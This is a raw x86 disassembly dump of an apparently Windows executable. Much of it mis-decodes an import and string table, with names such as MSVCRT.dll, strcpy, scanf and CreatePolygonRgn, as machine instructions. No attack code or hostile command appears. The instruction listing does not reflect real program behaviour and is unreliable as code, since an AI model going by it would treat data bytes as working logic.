  41254e:	add    DWORD PTR [eax],eax
  412550:	aam    0x29
  412552:	add    DWORD PTR [eax],eax
  412554:	loopne 0x41257f
  412556:	add    DWORD PTR [eax],eax
  412558:	jmp    0x129:0xf2000129
  41255f:	add    BYTE PTR [eax],al
  412561:	sub    al,BYTE PTR [ecx]
  412563:	add    BYTE PTR [edx],cl
  412565:	sub    al,BYTE PTR [ecx]
  412567:	add    BYTE PTR [edx+ebp*1],dl
  41256a:	add    DWORD PTR [eax],eax
  41256c:	and    ch,BYTE PTR [edx]
  41256e:	add    DWORD PTR [eax],eax
  412570:	sub    al,0x2a
  412572:	add    DWORD PTR [eax],eax
  412574:	xor    al,0x2a
  412576:	add    DWORD PTR [eax],eax
  412578:	inc    eax
  412579:	sub    al,BYTE PTR [ecx]
  41257b:	add    BYTE PTR [edx+0x2a],cl
  41257e:	add    DWORD PTR [eax],eax
  412580:	push   esp
  412581:	sub    al,BYTE PTR [ecx]
  412583:	add    BYTE PTR [esi+0x2a],bl
  412586:	add    DWORD PTR [eax],eax
  412588:	data16 sub al,BYTE PTR [ecx]
  41258b:	add    BYTE PTR [eax+0x2a],dh
  41258e:	add    DWORD PTR [eax],eax
  412590:	jp     0x4125bc
  412592:	add    DWORD PTR [eax],eax
  412594:	sub    BYTE PTR [edx],0x1
  412597:	add    BYTE PTR [esi-0x65fffed6],cl
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [edx-0x53fffed6],ah
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ac00001],dh
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	retf   0x12a
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    dl,dh
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    dh,bh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	add    BYTE PTR [eax],al
  4125c7:	add    BYTE PTR [edx],bl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [esi],ch
  4125cd:	sub    eax,DWORD PTR [ecx]
  4125cf:	add    BYTE PTR [esi],bh
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1+0x1],cl
  4125d7:	add    BYTE PTR [eax+0x2b],bl
  4125da:	add    DWORD PTR [eax],eax
  4125dc:	push   0x7e00012b
  4125e1:	sub    eax,DWORD PTR [ecx]
  4125e3:	add    BYTE PTR [edx-0x59fffed5],dl
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [ebx+ebp*1+0x2bca0001],bh
  4125f2:	add    DWORD PTR [eax],eax
  4125f4:	loopne 0x412621
  4125f6:	add    DWORD PTR [eax],eax
  4125f8:	in     al,dx
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    dh,bh
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    BYTE PTR [esi],dl
  412601:	sub    al,0x1
  412603:	add    BYTE PTR [eax],ch
  412605:	sub    al,0x1
  412607:	add    BYTE PTR [eax],bh
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [edx+0x2c],al
  41260e:	add    DWORD PTR [eax],eax
  412610:	pop    eax
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [edx+0x2c],dh
  412616:	add    DWORD PTR [eax],eax
  412618:	jle    0x412646
  41261a:	add    DWORD PTR [eax],eax
  41261c:	mov    ch,BYTE PTR [ecx+eax*1]
  41261f:	add    BYTE PTR [esi-0x47fffed4],bl
  412625:	sub    al,0x1
  412627:	add    ah,al
  412629:	sub    al,0x1
  41262b:	add    dl,dl
  41262d:	sub    al,0x1
  41262f:	add    ah,ah
  412631:	sub    al,0x1
  412633:	add    al,dh
  412635:	sub    al,0x1
  412637:	add    BYTE PTR [esi],al
  412639:	sub    eax,0x2d140001
  41263e:	add    DWORD PTR [eax],eax
  412640:	and    ch,BYTE PTR ds:0x2d300001
  412646:	add    DWORD PTR [eax],eax
  412648:	dec    edx
  412649:	sub    eax,0x2d5e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	push   0x2d
  412652:	add    DWORD PTR [eax],eax
  412654:	jp     0x412683
  412656:	add    DWORD PTR [eax],eax
  412658:	xchg   esi,eax
  412659:	sub    eax,0x2da60001
  41265e:	add    DWORD PTR [eax],eax
  412660:	mov    dh,0x2d
  412662:	add    DWORD PTR [eax],eax
  412664:	(bad)  
  412665:	sub    eax,0x2dd20001
  41266a:	add    DWORD PTR [eax],eax
  41266c:	loop   0x41269b
  41266e:	add    DWORD PTR [eax],eax
  412670:	hlt    
  412671:	sub    eax,0x2dfe0001
  412676:	add    DWORD PTR [eax],eax
  412678:	push   cs
  412679:	add    DWORD PTR cs:[eax],eax
  41267c:	push   ds
  41267d:	add    DWORD PTR cs:[eax],eax
  412680:	sub    BYTE PTR [esi],ch
  412682:	add    DWORD PTR [eax],eax
  412684:	add    BYTE PTR [eax],al
  412686:	add    BYTE PTR [eax],al
  412688:	dec    edx
  412689:	add    DWORD PTR cs:[eax],eax
  41268c:	add    BYTE PTR [eax],al
  41268e:	add    BYTE PTR [eax],al
  412690:	push   0x8000012e
  412695:	add    DWORD PTR cs:[eax],eax
  412698:	mov    WORD PTR [esi],gs
  41269a:	add    DWORD PTR [eax],eax
  41269c:	call   0x12e:0xb200012e
  4126a3:	add    dh,al
  4126a5:	add    DWORD PTR cs:[eax],eax
  4126a8:	fsubr  QWORD PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0xf84127df
  4126b1:	add    DWORD PTR cs:[eax],eax
  4126b4:	adc    BYTE PTR [edi],ch
  4126b6:	add    DWORD PTR [eax],eax
  4126b8:	push   ds
  4126b9:	das    
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	xor    BYTE PTR [edi],ch
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	inc    eax
  4126c1:	das    
  4126c2:	add    DWORD PTR [eax],eax
  4126c4:	push   esi
  4126c5:	das    
  4126c6:	add    DWORD PTR [eax],eax
  4126c8:	data16 das 
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	jbe    0x4126fd
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	mov    ch,BYTE PTR [edi]
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	xchg   esi,eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	mov    dl,0x2f
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	enter  0x12f,0x0
  4126e4:	loopne 0x412715
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	hlt    
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	add    dh,BYTE PTR [eax]
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	sbb    BYTE PTR [eax],dh
  4126f2:	add    DWORD PTR [eax],eax
  4126f4:	xor    BYTE PTR cs:[ecx],al
  4126f7:	add    BYTE PTR [edx],bh
  4126f9:	xor    BYTE PTR [ecx],al
  4126fb:	add    BYTE PTR [eax+0x30],cl
  4126fe:	add    DWORD PTR [eax],eax
  412700:	push   edx
  412701:	xor    BYTE PTR [ecx],al
  412703:	add    BYTE PTR [esi+0x30],ah
  412706:	add    DWORD PTR [eax],eax
  412708:	jbe    0x41273a
  41270a:	add    DWORD PTR [eax],eax
  41270c:	mov    dh,BYTE PTR [eax]
  41270e:	add    DWORD PTR [eax],eax
  412710:	pushf  
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax-0x3bfffed0],dh
  412719:	xor    BYTE PTR [ecx],al
  41271b:	add    ah,dl
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    dl,ch
  412721:	xor    BYTE PTR [ecx],al
  412723:	add    BYTE PTR [edx],al
  412725:	xor    DWORD PTR [ecx],eax
  412727:	add    BYTE PTR [edx],bl
  412729:	xor    DWORD PTR [ecx],eax
  41272b:	add    BYTE PTR [esi],ah
  41272d:	xor    DWORD PTR [ecx],eax
  41272f:	add    BYTE PTR [eax],bh
  412731:	xor    DWORD PTR [ecx],eax
  412733:	add    BYTE PTR [edx+0x31],cl
  412736:	add    DWORD PTR [eax],eax
  412738:	push   esi
  412739:	xor    DWORD PTR [ecx],eax
  41273b:	add    BYTE PTR [eax+0x31],ch
  41273e:	add    DWORD PTR [eax],eax
  412740:	jbe    0x412773
  412742:	add    DWORD PTR [eax],eax
  412744:	xor    BYTE PTR [ecx],0x1
  412747:	add    BYTE PTR [esi-0x59fffecf],dl
  41274d:	xor    DWORD PTR [ecx],eax
  41274f:	add    BYTE PTR [eax-0x2dfffecf],bh
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    dl,ch
  412759:	xor    DWORD PTR [ecx],eax
  41275b:	add    BYTE PTR [eax],al
  41275d:	add    BYTE PTR [eax],al
  41275f:	add    BYTE PTR [esi],al
  412761:	xor    al,BYTE PTR [ecx]
  412763:	add    BYTE PTR [edx+esi*1],bl
  412766:	add    DWORD PTR [eax],eax
  412768:	xor    dh,BYTE PTR [edx]
  41276a:	add    DWORD PTR [eax],eax
  41276c:	inc    edx
  41276d:	xor    al,BYTE PTR [ecx]
  41276f:	add    BYTE PTR [edx+0x32],dl
  412772:	add    DWORD PTR [eax],eax
  412774:	pusha  
  412775:	xor    al,BYTE PTR [ecx]
  412777:	add    BYTE PTR [eax+0x32],dh
  41277a:	add    DWORD PTR [eax],eax
  41277c:	test   BYTE PTR [edx],dh
  41277e:	add    DWORD PTR [eax],eax
  412780:	xchg   esp,eax
  412781:	xor    al,BYTE PTR [ecx]
  412783:	add    BYTE PTR [eax-0x41fffece],ch
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    ah,cl
  41278d:	xor    al,BYTE PTR [ecx]
  41278f:	add    al,ah
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    al,dh
  412795:	xor    al,BYTE PTR [ecx]
  412797:	add    BYTE PTR [edx],al
  412799:	xor    eax,DWORD PTR [ecx]
  41279b:	add    BYTE PTR [edx],bl
  41279d:	xor    eax,DWORD PTR [ecx]
  41279f:	add    BYTE PTR [esi],ah
  4127a1:	xor    eax,DWORD PTR [ecx]
  4127a3:	add    BYTE PTR [ebx+esi*1],dh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	inc    esp
  4127a9:	xor    eax,DWORD PTR [ecx]
  4127ab:	add    BYTE PTR [edx+0x33],dl
  4127ae:	add    DWORD PTR [eax],eax
  4127b0:	push   0x7a000133
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi-0x6bfffecd],al
  4127bd:	xor    eax,DWORD PTR [ecx]
  4127bf:	add    BYTE PTR [esi-0x4bfffecd],ah
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    dh,al
  4127c9:	xor    eax,DWORD PTR [ecx]
  4127cb:	add    al,bl
  4127cd:	xor    eax,DWORD PTR [ecx]
  4127cf:	add    dl,ch
  4127d1:	xor    eax,DWORD PTR [ecx]
  4127d3:	add    dl,bh
  4127d5:	xor    eax,DWORD PTR [ecx]
  4127d7:	add    BYTE PTR [esi],al
  4127d9:	xor    al,0x1
  4127db:	add    BYTE PTR [esp+esi*1],bl
  4127de:	add    DWORD PTR [eax],eax
  4127e0:	cmp    BYTE PTR [ecx+eax*1],dh
  4127e3:	add    BYTE PTR [edx+0x34],dl
  4127e6:	add    DWORD PTR [eax],eax
  4127e8:	data16 xor al,0x1
  4127eb:	add    BYTE PTR [esp+esi*1+0x1],dh
  4127ef:	add    BYTE PTR [eax-0x6dfffecc],al
  4127f5:	xor    al,0x1
  4127f7:	add    BYTE PTR [edx-0x51fffecc],ah
  4127fd:	xor    al,0x1
  4127ff:	add    BYTE PTR [edx-0x37fffecc],bh
  412805:	xor    al,0x1
  412807:	add    al,ah
  412809:	xor    al,0x1
  41280b:	add    al,dh
  41280d:	xor    al,0x1
  41280f:	add    BYTE PTR [eax],cl
  412811:	xor    eax,0x351a0001
  412816:	add    DWORD PTR [eax],eax
  412818:	sub    dh,BYTE PTR ds:0x35380001
  41281e:	add    DWORD PTR [eax],eax
  412820:	dec    edx
  412821:	xor    eax,0x35580001
  412826:	add    DWORD PTR [eax],eax
  412828:	fs xor eax,0x35720001
  41282e:	add    DWORD PTR [eax],eax
  412830:	jl     0x412867
  412832:	add    DWORD PTR [eax],eax
  412834:	xchg   esp,eax
  412835:	xor    eax,0x35a40001
  41283a:	add    DWORD PTR [eax],eax
  41283c:	mov    ah,0x35
  41283e:	add    DWORD PTR [eax],eax
  412840:	ret    0x135
  412843:	add    al,dl
  412845:	xor    eax,0x35e00001
  41284a:	add    DWORD PTR [eax],eax
  41284c:	div    BYTE PTR ds:0x36080001
  412852:	add    DWORD PTR [eax],eax
  412854:	push   ss
  412855:	add    DWORD PTR ss:[eax],eax
  412858:	sub    al,0x36
  41285a:	add    DWORD PTR [eax],eax
  41285c:	cmp    dh,BYTE PTR [esi]
  41285e:	add    DWORD PTR [eax],eax
  412860:	push   edx
  412861:	add    DWORD PTR ss:[eax],eax
  412864:	pop    esi
  412865:	add    DWORD PTR ss:[eax],eax
  412868:	push   0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	jbe    0x4128a4
  41286e:	add    DWORD PTR [eax],eax
  412870:	test   BYTE PTR [esi],dh
  412872:	add    DWORD PTR [eax],eax
  412874:	xchg   esi,eax
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	mov    ds:0xb4000136,al
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	shl    BYTE PTR [esi],0x1
  412883:	add    dh,cl
  412885:	add    DWORD PTR ss:[eax],eax
  412888:	fdiv   QWORD PTR [esi]
  41288a:	add    DWORD PTR [eax],eax
  41288c:	call   0xf64129c7
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	add    al,0x37
  412896:	add    DWORD PTR [eax],eax
  412898:	adc    al,0x37
  41289a:	add    DWORD PTR [eax],eax
  41289c:	es aaa 
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	cmp    al,0x37
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	inc    esi
  4128a5:	aaa    
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	push   esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	fs aaa 
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	jbe    0x4128e9
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	test   BYTE PTR [edi],dh
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	cwde   
  4128b9:	aaa    
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    dl,0x37
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	les    esi,FWORD PTR [edi]
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	aam    0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	call   0xfa412a04
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	or     bh,BYTE PTR [eax]
  4128d2:	add    DWORD PTR [eax],eax
  4128d4:	push   ss
  4128d5:	cmp    BYTE PTR [ecx],al
  4128d7:	add    BYTE PTR [eax+edi*1],dh
  4128da:	add    DWORD PTR [eax],eax
  4128dc:	inc    esi
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1+0x1],bl
  4128e3:	add    BYTE PTR [eax+0x38],bh
  4128e6:	add    DWORD PTR [eax],eax
  4128e8:	nop
  4128e9:	cmp    BYTE PTR [ecx],al
  4128eb:	add    BYTE PTR [eax+edi*1+0x38b00001],bl
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	mov    edx,0xc8000138
  4128f9:	cmp    BYTE PTR [ecx],al
  4128fb:	add    ah,ah
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dl,dh
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    BYTE PTR [esi],al
  412905:	cmp    DWORD PTR [ecx],eax
  412907:	add    BYTE PTR [eax],bl
  412909:	cmp    DWORD PTR [ecx],eax
  41290b:	add    BYTE PTR [edx],ch
  41290d:	cmp    DWORD PTR [ecx],eax
  41290f:	add    BYTE PTR [edx],bh
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [eax+0x39],dl
  412916:	add    DWORD PTR [eax],eax
  412918:	cmp    WORD PTR [ecx],ax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    al,ch
  412921:	add    esi,DWORD PTR [ebx+0x74]
  412924:	jb     0x412989
  412926:	jo     0x4129a1
  412928:	add    BYTE PTR [eax],al
  41292a:	or     eax,0x676e7504
  41292f:	gs je  0x412995
  412932:	add    BYTE PTR [eax],al
  412934:	pop    edi
  412935:	add    esp,DWORD PTR [ebx+0x6c]
  412938:	gs popa 
  41293a:	jb     0x4129a1
  41293c:	jb     0x4129b0
  41293e:	add    BYTE PTR [eax],al
  412940:	sub    BYTE PTR [edi+esi*2],al
  412943:	arpl   WORD PTR [ebx+0x6e],si
  412946:	arpl   WORD PTR [ebp+0x70],bp
  412949:	add    ch,dh
  41294b:	add    BYTE PTR [edi+0x63],bl
  41294e:	outs   dx,DWORD PTR ds:[esi]
  41294f:	outs   dx,BYTE PTR ds:[esi]
  412950:	je     0x4129c4
  412952:	outs   dx,DWORD PTR ds:[esi]
  412953:	ins    BYTE PTR es:[edi],dx
  412954:	data16 jo 0x412957
  412957:	add    BYTE PTR [ebp+0x6c616d03],dh
  41295d:	ins    BYTE PTR es:[edi],dx
  41295e:	outs   dx,DWORD PTR ds:[esi]
  41295f:	arpl   WORD PTR [eax],ax
  412961:	add    BYTE PTR [ebx+0x735f5f00],dh
  412967:	gs je  0x4129c9
  41296a:	popa   
  41296b:	jo     0x4129dd
  41296d:	pop    edi
  41296e:	je     0x4129e9
  412970:	jo     0x4129d7
  412972:	add    BYTE PTR [eax],al
  412974:	add    eax,DWORD PTR [ebx+esi*2]
  412977:	jns    0x4129ec
  412979:	je     0x4129e0
  41297b:	ins    DWORD PTR es:[edi],dx
  41297c:	add    BYTE PTR [eax],al
  41297e:	mov    al,ds:0x705f5f00
  412983:	pop    edi
  412984:	pop    edi
  412985:	ins    WORD PTR es:[edi],dx
  412987:	outs   dx,DWORD PTR ds:[esi]
  412988:	fs add BYTE PTR gs:[eax],al
  41298c:	pop    ebp
  41298d:	add    esp,DWORD PTR [ebx+0x61]
  412990:	ins    BYTE PTR es:[edi],dx
  412991:	ins    BYTE PTR es:[edi],dx
  412992:	outs   dx,DWORD PTR ds:[esi]
  412993:	arpl   WORD PTR [eax],ax
  412995:	add    BYTE PTR [ebx+0x705f5f00],bl
  41299b:	pop    edi
  41299c:	pop    edi
  41299d:	arpl   WORD PTR [edi+0x6d],bp
  4129a0:	ins    DWORD PTR es:[edi],dx
  4129a1:	outs   dx,DWORD PTR ds:[esi]
  4129a2:	fs add BYTE PTR gs:[eax],al
  4129a6:	std    
  4129a7:	add    esi,DWORD PTR [ebx+0x74]
  4129aa:	jb     0x412a20
  4129ac:	outs   dx,DWORD PTR ds:[esi]
  4129ad:	jne    0x412a1b
  4129af:	add    BYTE PTR [esi],dl
  4129b1:	add    al,0x76
  4129b3:	jae    0x412a25
  4129b5:	jb     0x412a20
  4129b7:	outs   dx,BYTE PTR ds:[esi]
  4129b8:	je     0x412a20
  4129ba:	add    BYTE PTR [eax],al
  4129bc:	sub    al,0x4
  4129be:	ja     0x412a23
  4129c0:	jae    0x412a32
  4129c2:	bound  esi,QWORD PTR [edx+0x6b]
  4129c5:	add    bl,bl
  4129c7:	add    BYTE PTR [edi+0x61],bl
  4129ca:	ins    DWORD PTR es:[edi],dx
  4129cb:	jae    0x412a34
  4129cd:	pop    edi
  4129ce:	gs js  0x412a3a
  4129d1:	je     0x4129d3
  4129d3:	add    BYTE PTR [esi+0x6e695f01],al
  4129d9:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x94006d72
  4129e1:	add    ebp,DWORD PTR [ecx+0x73]
  4129e4:	popa   
  4129e5:	ins    BYTE PTR es:[edi],dx
  4129e6:	outs   dx,BYTE PTR ds:[esi]
  4129e7:	jne    0x412a56
  4129e9:	add    BYTE PTR [ebp+0x3],ch
  4129ec:	data16 addr16 gs je 0x412a54
  4129f1:	add    BYTE PTR [esi+0x73695f01],bl
  4129f7:	ins    DWORD PTR es:[edi],dx
  4129f8:	bound  esp,QWORD PTR [edx+0x6c]
  4129fb:	gs popa 
  4129fd:	add    BYTE PTR fs:[eax],al
  412a00:	pop    ebx
  412a01:	add    esp,DWORD PTR [edx+0x73]
  412a04:	gs popa 
  412a06:	jb     0x412a6b
  412a08:	push   0x7303e500
  412a0d:	je     0x412a81
  412a0f:	arpl   WORD PTR [eax+0x72],bp
  412a12:	add    BYTE PTR [eax],al
  412a14:	push   edx
  412a15:	add    BYTE PTR [edi+0x58],bl
  412a18:	arpl   WORD PTR [eax+0x74],si
  412a1b:	inc    esi
  412a1c:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x3e70072
  412a24:	jae    0x412a9a
  412a26:	jb     0x412a8b
  412a28:	outs   dx,DWORD PTR ds:[esi]
  412a29:	ins    BYTE PTR es:[edi],dx
  412a2a:	ins    BYTE PTR es:[edi],dx
  412a2b:	add    BYTE PTR [esi],al
  412a2d:	add    al,0x74
  412a2f:	imul   ebp,DWORD PTR [ebp+0x65],0x3b10000
  412a36:	ins    BYTE PTR es:[edi],dx
  412a37:	outs   dx,DWORD PTR ds:[esi]
  412a38:	arpl   WORD PTR [ecx+0x6c],sp
  412a3b:	je     0x412aa6
  412a3d:	ins    DWORD PTR es:[edi],dx
  412a3e:	add    BYTE PTR gs:[eax],bh
  412a41:	add    al,0x77
  412a43:	arpl   WORD PTR [ebx+0x74],si
  412a46:	outs   dx,DWORD PTR ds:[esi]
  412a47:	jne    0x412ab5
  412a49:	add    BYTE PTR [ecx],ah
  412a4b:	add    al,0x77
  412a4d:	arpl   WORD PTR [ebx+0x63],si
  412a50:	jo     0x412acb
  412a52:	add    BYTE PTR [eax],al
  412a54:	enter  0x7003,0x75
  412a58:	je     0x412abd
  412a5a:	push   0x78007261
  412a5f:	add    esp,DWORD PTR [esi+0x70]
  412a62:	jne    0x412ad8
  412a64:	arpl   WORD PTR [eax],ax
  412a66:	sbb    al,0x4
  412a68:	ja     0x412acd
  412a6a:	jae    0x412acf
  412a6c:	popa   
  412a6d:	je     0x412a6f
  412a6f:	add    dl,ch
  412a71:	add    esi,DWORD PTR [ebx+0x74]
  412a74:	jb     0x412ad9
  412a76:	jae    0x412ae8
  412a78:	outs   dx,BYTE PTR ds:[esi]
  412a79:	add    BYTE PTR [ebx+0x65736603],al
  412a7f:	imul   eax,DWORD PTR gs:[eax],0xffffffb7
  412a83:	add    ebp,DWORD PTR [ebp+0x62]
  412a86:	jae    0x412afc
  412a88:	outs   dx,DWORD PTR ds:[esi]
  412a89:	ja     0x412aee
  412a8b:	jae    0x412a8d
  412a8d:	add    BYTE PTR [ebx],cl
  412a8f:	add    al,0x74
  412a91:	outs   dx,DWORD PTR ds:[esi]
  412a92:	ja     0x412b00
  412a94:	outs   dx,DWORD PTR ds:[esi]
  412a95:	ja     0x412afc
  412a97:	jb     0x412a99
  412a99:	add    ah,cl
  412a9b:	add    esi,DWORD PTR [ecx+0x73]
  412a9e:	outs   dx,DWORD PTR ds:[esi]
  412a9f:	jb     0x412b15
  412aa1:	add    BYTE PTR [ecx],al
  412aa3:	add    al,0x73
  412aa5:	ja     0x412b1a
  412aa7:	arpl   WORD PTR [ecx+0x6e],sp
  412aaa:	data16 add BYTE PTR [ebx],ah
  412aad:	add    DWORD PTR [edi+0x65],ebx
  412ab0:	js     0x412b1b
  412ab2:	je     0x412ab4
  412ab4:	ss add al,0x77
  412ab7:	arpl   WORD PTR [ebx+0x74],si
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	ins    DWORD PTR es:[edi],dx
  412abc:	bound  esi,QWORD PTR [ebx+0x0]
  412abf:	add    al,ch
  412ac1:	add    BYTE PTR [edi+0x63],bl
  412ac4:	gs js  0x412b30
  412ac7:	je     0x412ac9
  412ac9:	add    BYTE PTR [ecx],ch
  412acb:	add    al,0x77
  412acd:	arpl   WORD PTR [ebx+0x6e],si
  412ad0:	arpl   WORD PTR [eax+0x79],si
  412ad3:	add    BYTE PTR [ebx+0x70736903],bl
  412ad9:	jb     0x412b44
  412adb:	outs   dx,BYTE PTR ds:[esi]
  412adc:	je     0x412ade
  412ade:	mov    ch,0x0
  412ae0:	pop    edi
  412ae1:	pop    edi
  412ae2:	jae    0x412b49
  412ae4:	je     0x412b5b
  412ae6:	jae    0x412b4d
  412ae8:	jb     0x412b57
  412aea:	popa   
  412aeb:	je     0x412b55
  412aed:	gs jb  0x412b62
  412af0:	add    BYTE PTR [eax],al
  412af2:	sbb    BYTE PTR [esi+esi*2],al
  412af5:	jae    0x412b6e
  412af7:	jo     0x412b6b
  412af9:	imul   ebp,DWORD PTR [esi+0x74],0x720066
  412b00:	pop    edi
  412b01:	pop    edi
  412b02:	addr16 gs je 0x412b73
  412b06:	popa   
  412b07:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b0e:	dec    ebp
  412b0f:	push   ebx
  412b10:	push   esi
  412b11:	inc    ebx
  412b12:	push   edx
  412b13:	push   esp
  412b14:	cs fs ins BYTE PTR es:[edi],dx
  412b17:	ins    BYTE PTR es:[edi],dx
  412b18:	add    BYTE PTR [eax],al
  412b1a:	fadd   QWORD PTR [ecx]
  412b1c:	push   ebx
  412b1d:	gs je  0x412b64
  412b20:	dec    ecx
  412b21:	inc    edx
  412b22:	inc    ebx
  412b23:	outs   dx,DWORD PTR ds:[esi]
  412b24:	ins    BYTE PTR es:[edi],dx
  412b25:	outs   dx,DWORD PTR ds:[esi]
  412b26:	jb     0x412b7c
  412b28:	popa   
  412b29:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b2d:	add    bh,dl
  412b2f:	add    DWORD PTR [ebx+0x65],edx
  412b32:	je     0x412b76
  412b34:	jb     0x412bab
  412b36:	jae    0x412ba0
  412b38:	dec    edi
  412b39:	jb     0x412ba2
  412b3b:	inc    ebp
  412b3c:	js     0x412b3e
  412b3e:	add    DWORD PTR [eax],0x626d6f43
  412b44:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  412b4b:	add    BYTE PTR [ecx+eax*1],ah
  412b4e:	inc    edi
  412b4f:	gs je  0x412b94
  412b52:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  412b56:	gs add bh,cl
  412b59:	add    DWORD PTR [ebx+0x65],edx
  412b5c:	ins    BYTE PTR es:[edi],dx
  412b5d:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  412b62:	ins    BYTE PTR es:[edi],dx
  412b63:	gs je  0x412bda
  412b66:	add    BYTE PTR gs:[ecx+0x65724300],cl
  412b6d:	popa   
  412b6e:	je     0x412bd5
  412b70:	inc    edx
  412b71:	jb     0x412be8
  412b73:	jae    0x412bdd
  412b75:	dec    ecx
  412b76:	outs   dx,BYTE PTR ds:[esi]
  412b77:	imul   esi,DWORD PTR fs:[edx+0x65],0xaa007463
  412b7f:	add    BYTE PTR [ebx+0x72],al
  412b82:	gs popa 
  412b84:	je     0x412beb
  412b86:	push   eax
  412b87:	outs   dx,DWORD PTR ds:[esi]
  412b88:	ins    BYTE PTR es:[edi],dx
  412b89:	jns    0x412bf2
  412b8b:	outs   dx,DWORD PTR ds:[esi]
  412b8c:	outs   dx,BYTE PTR ds:[esi]
  412b8d:	push   edx
  412b8e:	outs   dx,BYTE PTR ds:[si]
  412b90:	add    BYTE PTR [eax],al
  412b92:	mov    al,ds:0x65724300
  412b97:	popa   
  412b98:	je     0x412bff
  412b9a:	dec    eax
  412b9b:	popa   
  412b9c:	je     0x412c01
  412b9e:	push   0x73757242
  412ba3:	push   0x17a0000
  412ba8:	inc    edi
  412ba9:	gs je  0x412bff
  412bac:	jns    0x412c21
  412bae:	je     0x412c15
  412bb0:	ins    DWORD PTR es:[edi],dx
  412bb1:	push   eax
  412bb2:	popa   
  412bb3:	ins    BYTE PTR es:[edi],dx
  412bb4:	gs je  0x412c2b
  412bb7:	gs push ebp
  412bb9:	jae    0x412c20
  412bbb:	add    BYTE PTR [esi+0x65724300],bl
  412bc1:	popa   
  412bc2:	je     0x412c29
  412bc4:	inc    esi
  412bc5:	outs   dx,DWORD PTR ds:[esi]
  412bc6:	outs   dx,BYTE PTR ds:[esi]
  412bc7:	je     0x412c20
  412bc9:	add    BYTE PTR [ebp+0x65724300],bl
  412bcf:	popa   
  412bd0:	je     0x412c37
  412bd2:	inc    esi
  412bd3:	outs   dx,DWORD PTR ds:[esi]
  412bd4:	outs   dx,BYTE PTR ds:[esi]
  412bd5:	je     0x412c20
  412bd7:	outs   dx,BYTE PTR ds:[esi]
  412bd8:	imul   esi,DWORD PTR fs:[edx+0x65],0x577463
  412be0:	mov    ah,0x1
  412be2:	push   eax
  412be3:	outs   dx,DWORD PTR ds:[esi]
  412be4:	ins    BYTE PTR es:[edi],dx
  412be5:	jns    0x412c53
  412be7:	imul   ebp,DWORD PTR [esi+0x65],0x18a0000
  412bee:	inc    edi
  412bef:	gs je  0x412c46
  412bf2:	gs js  0x412c69
  412bf5:	dec    ebp
